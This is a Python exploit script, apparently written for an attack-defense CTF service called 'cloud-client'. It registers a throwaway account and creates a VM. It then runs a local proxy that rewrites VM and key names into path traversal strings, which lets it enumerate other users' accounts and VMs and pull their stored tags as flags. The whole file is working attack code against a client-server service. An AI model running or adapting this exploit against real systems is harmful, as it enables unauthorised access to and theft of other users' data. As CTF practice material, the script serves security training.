#!/usr/bin/python
import string
from sys import argv
from time import sleep
from pwn import process, context
from os import kill, remove
from binascii import unhexlify
from base64 import b64decode, b64encode
from subprocess import Popen
from random import randrange, SystemRandom

# context.log_level="debug"

UNIQPORTS = []

def gen_rand_str(length):
    return ''.join(SystemRandom()
                   .choice(string.ascii_letters + string.digits)
             for _ in range(length))

def clean(pid, file):
    kill(pid, 9)
    remove(file)

def register(ip, port, email, username, password):
    io = process("./cloud-client -ip={ip} -port={port} -register -rapid-connect".format(ip=ip, port=port), shell=True)
    io.sendlineafter(b"Email: ", email)
    io.sendlineafter(b"Username: ", username)
    io.sendlineafter(b"Password: ", password)
    io.recv()
    return

def createvm(ip, port, email, password):
    io = process("./cloud-client -ip={ip} -port={port} -login -rapid-connect".format(ip=ip, port=port), shell=True)
    io.sendlineafter(b"Email: ", email)
    io.sendlineafter(b"Password: ", password)
    io.sendlineafter(b">> \x1b[0m", "1")
    vmname = gen_rand_str(6)
    vmtag = gen_rand_str(7)
    keyname = gen_rand_str(8)
    io.sendlineafter(b"Name: ", vmname)
    io.sendlineafter(b"Tag: ", vmtag)
    io.sendlineafter(b">> \x1b[0m", str(randrange(0,6)))
    io.sendlineafter(b"Input >> ", b64encode(gen_rand_str(randrange(30,40)).encode()))
    io.sendlineafter(b"key? ", keyname)
    io.sendlineafter(b"Choice >> ", "y")
    io.sendlineafter(b">> \x1b[0m", "9")
    return vmname, keyname

def getlist(ip, lport, email, password, vmname, keyname):
    io = process("./cloud-client -ip={ip} -port={port} -login -rapid-connect".format(ip=ip, port=lport), shell=True)
    io.sendlineafter(b"Email: ", email)
    io.sendlineafter(b"Password: ", password)
    io.sendlineafter(b">> \x1b[0m", "5")
    io.sendlineafter(b"VM name: ", vmname)
    io.sendlineafter(b"Key name: ", keyname)
    check = io.recv()
    if(b"You have no VMs" in check):
        return []
    io.unrecv(check)    
    io.recvuntil("with the VM:")
    io.recvuntil("[")
    accounts = io.recvuntil("]")[:-1]
    return accounts.split(b", ")

def gettag(ip, lport, email, password, vmname, keyname):
    io = process("./cloud-client -ip={ip} -port={port} -login -rapid-connect".format(ip=ip, port=lport), shell=True)
    io.sendlineafter(b"Email: ", email)
    io.sendlineafter(b"Password: ", password)
    io.sendlineafter(b">> \x1b[0m", "5")
    io.sendlineafter(b"VM name: ", vmname)
    io.sendlineafter(b"Key name: ", keyname)
    io.recvuntil(":")
    return unhexlify(io.recvlines(3)[-1]).split(b"tag=b'")[1].split(b"',")[0].decode()


def exploit(ip, port):
    flags = []
    email = gen_rand_str(randrange(0,7))+"@"+gen_rand_str(randrange(3,7))+".com"
    username = gen_rand_str(10)
    password = gen_rand_str(13)
    register(ip, port, email, username, password)
    vmname, keyname = createvm(ip, port, email, password)
    pid, lport, repname = create_proxy(ip, port, {vmname: "../"})
    accounts = list(map(lambda x: x.decode(), getlist("localhost", lport, email, password, vmname, keyname)))
    clean(pid, repname)
    for account in accounts:
        pid, lport, repname = create_proxy(ip, port, {vmname: "../{}".format(account)})
        vms = list(map(lambda x: x.decode(), getlist("localhost", lport, email, password, vmname, keyname)))
        clean(pid, repname)
        if(len(vms)!=0):
            for vm in vms:
                pid, fport, repname = create_proxy(ip, port, {vmname: "../{}".format(account), keyname: "{}/{}.details".format(vm, vm)})
                flags.append(gettag("localhost", fport, email, password, vmname, keyname))
                clean(pid, repname)
    print("Exploit Completed!!")
    print(flags)

def create_proxy(ip, rport, replaces):
    lport = randrange(10000, 65535)
    while lport in UNIQPORTS: lport = randrange(10000, 65535)
    UNIQPORTS.append(lport)
    repname = gen_rand_str(5)+".rep"
    writer = open(repname, "w")
    for key in replaces:
        writer.write(str(len(key)).ljust(8,chr(0))+":"+str(len(replaces[key])).ljust(8,chr(0))+"\n")
        writer.write(key+":"+replaces[key]+"\n")
    prox = Popen(['tcpproxy/tcpproxy.py', '-om', 'replace:file={}'.format(repname), '-ti', ip, '-tp', str(rport), '-li', 'localhost', '-lp', str(lport)], close_fds=True)
    sleep(0.5)
    return prox.pid, lport, repname

exploit(argv[1], argv[2])